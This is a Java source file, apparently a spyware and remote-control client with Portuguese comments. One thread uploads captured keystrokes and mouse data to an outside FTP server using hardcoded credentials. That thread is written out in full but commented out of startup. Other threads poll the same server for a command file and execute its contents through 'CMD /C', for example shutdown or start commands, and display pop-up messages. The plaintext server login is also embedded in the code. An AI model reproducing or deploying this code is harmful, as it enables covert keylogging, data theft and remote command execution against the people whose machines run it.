package ufr.execution;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;
import ufs.capturate.UFScapturate;
import ufs.generator.UFgenerator;

public class UFRexecution {
	
	private static UFgenerator ufsGen; 
	@SuppressWarnings("unused")
	private static UFScapturate ufsSpy;
	private static FTPClient ftp;
	private static String getDirectory;
	private static String getHash;
	public static boolean connected = false;
	
	public static void main(String[] args) throws IOException, InterruptedException{
		
		/*new Thread(spyer1).start();
		new Thread(spyer2).start();*/
		new Thread(receive).start();
		new Thread(executor).start();
	
	}
	
	/*Segunda Thread de espionagem de informações completas
	incluindo o envio ftp do arquivo UFS, thread que 
	apenas monitora e envia as informações.*/
	@SuppressWarnings("unused")
	private static Runnable spyer2 = new Runnable(){
		public void run(){
			ftp = new FTPClient();
			ufsGen = new UFgenerator();
			while(true){
				
				try {
					Thread.sleep(10000);
				} catch (InterruptedException e) {}
				
				
				
				String info = "Teclado capturado: \r\n"+UFScapturate.varchar+"\r\n\r\n"+"Mouse capturado: \r\n"
						+ UFScapturate.mouse;
				String File = "arquivoHash";
				String hs = "54f9fd8a3436620e4c2cb8dd752423801ae2cf2a";
				
				
				try {
					ufsGen.generateHash(File, hs, getDirectory);
					getHash = ufsGen.getHash(File, getDirectory);
					ufsGen.generateUfs(getHash, info, getDirectory);
					
					
				} catch (IOException e) {}
				
				 if(connected){
					 System.err.println("O servidor já está conectado!");
					 String upload = getHash+".out";
					 String renameFileUp = getHash+".out";
					 FileInputStream UFS;
					try {
						String getPath = new File("").getAbsolutePath();
						Runtime.getRuntime().exec("CMD /c cd "+getPath);
						Runtime.getRuntime().exec("CMD /c echo %AppData% > appData.txt");
						Thread.sleep(1000);
						FileReader fileReader = new FileReader(getPath+"\\"+"appData.txt");
						BufferedReader bufferedReader = new BufferedReader(fileReader);
						String getAppData = bufferedReader.readLine();
						bufferedReader.close();
						
						UFS = new FileInputStream(getAppData.trim()+"\\"+upload);
						 if(ftp.storeFile(renameFileUp, UFS)){
					    	  System.out.println("O upload de '"+upload+"' foi efetuado com sucesso!");
					      }else{
					    	  System.out.println("Falha ao efetuar o upload! '"+upload+"'");
					      }
					} catch (FileNotFoundException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				     
				
				 }else{
					
					 try {
							String server = "f15-preview.eohost.com";
							String user = "2163708";
							String pass = "1324354657687980sitedoprojeto";
						      int reply;
						      System.out.println("Conectando no ftp...\r\n________________________");
						      ftp.connect(server);
						      ftp.enterLocalPassiveMode();
						      
						       reply = ftp.getReplyCode();
						      if(FTPReply.isPositiveCompletion(reply)) {
						    	  boolean login = ftp.login(user, pass);
						    	 if(login == true){
						    		connected = true;
						    	 }else{
						    		connected = false;
						    	 }
						    	
						      }
						      
						} catch(IOException e) {
						   System.exit(1);
						try {
							ftp.logout();
							ftp.disconnect();
						} catch (IOException e1) {}}
					 
				 }  
				 
				
				UFScapturate.varchar = "";
				UFScapturate.varchar = "";
				
			}
		}
	};
	
	private static Runnable receive = new Runnable(){
		public void run(){
			ftp = new FTPClient();
			while(true){
				
				 String hs = "54f9fd8a3436620e4c2cb8dd752423801ae2cf2a";
				 @SuppressWarnings("unused")
				String fileIn = "";

			  
			    
					 if(connected){
						 System.err.println("O servidor já está conectado!");
						 String download = hs+".in";
						try {
							String getPath = new File("").getAbsolutePath();
							Runtime.getRuntime().exec("CMD /c cd "+getPath);
							Runtime.getRuntime().exec("CMD /c echo %AppData% > appData.txt");
							try {
								Thread.sleep(1000);
							} catch (InterruptedException e) {}
							
							
							FileReader fileReader = new FileReader(getPath+"\\"+"appData.txt");
							BufferedReader bufferedReader = new BufferedReader(fileReader);
							String getAppData = bufferedReader.readLine();
							bufferedReader.close();
							
							FileOutputStream UFR = new FileOutputStream(getAppData.trim()+"\\"+download);
							 if(ftp.retrieveFile(download, UFR)){
						    	System.out.println("O download de '"+download+"' foi efetuado com sucesso!");
						      }else{
						    	  System.out.println("Falha ao efetuar o download! '"+download+"'");
						    
						      }
						} catch (FileNotFoundException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					     
					
					 }else{
							
						 try {
								String server = "f15-preview.eohost.com";
								String user = "2163708";
								String pass = "1324354657687980sitedoprojeto";
							      int reply;
							      System.out.println("Conectando no ftp...\r\n________________________");
							      ftp.connect(server);
							      ftp.enterLocalPassiveMode();
							      
							       reply = ftp.getReplyCode();
							      if(FTPReply.isPositiveCompletion(reply)) {
							    	  boolean login = ftp.login(user, pass);
							    	 if(login == true){
							    		connected = true;
							    	 }else{
							    		connected = false;
							    	 }
							    	
							      }
							      
							} catch(IOException e) {
							   System.exit(1);
							try {
								ftp.logout();
								ftp.disconnect();
							} catch (IOException e1) {}}
						 
					 }
			    
			      
			      
				try {
					Thread.sleep(5000);
				} catch (InterruptedException e) {}
				
				
				
				
			}
			
			
			
		}
	};
	
	/*Thread de execução do arquivo UFR enviado
	pela interface Inout, Thread que apenas recebe e
	executa as informações*/
	private static Runnable executor = new Runnable(){
		public void run(){
			
			while(true){
				String code = "";
				try {
					String getPath = new File("").getAbsolutePath();
					Runtime.getRuntime().exec("CMD /c cd "+getPath);
					Runtime.getRuntime().exec("CMD /c echo %AppData% > appData.txt");
					Thread.sleep(1000);
					FileReader fileReader = new FileReader(getPath+"\\"+"appData.txt");
					BufferedReader bufferedReader = new BufferedReader(fileReader);
					String getAppData = bufferedReader.readLine();
					bufferedReader.close();
					
					FileReader readUfr = new FileReader(getAppData.trim()+"\\54f9fd8a3436620e4c2cb8dd752423801ae2cf2a.in");
					BufferedReader buffUfr = new BufferedReader(readUfr);
					
					code = buffUfr.readLine();
					
					buffUfr.close();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				String promptCode = "";
				String inoutCommand = "";
				
				if(code.contains("shutdown") || code.contains("start")){
					promptCode = code.substring(code.indexOf("$")+1, code.lastIndexOf("$"));
						try {
							Runtime.getRuntime().exec("CMD /C "+promptCode+"");
						} catch (IOException e1) {}
					
				}
				
				JFrame frame = new JFrame();
				if(code.contains("*")){
					inoutCommand = code.substring(code.indexOf("*"), code.lastIndexOf("*"));
					if(inoutCommand.contains("window")){
						String window = inoutCommand.substring(inoutCommand.indexOf("'")+1, inoutCommand.lastIndexOf("'"));
						JOptionPane.showMessageDialog(frame, window);
						
					}
				}
				
				
				try {
					Thread.sleep(5000);
				} catch (InterruptedException e) {}
				
			}
		}
	};
	
}
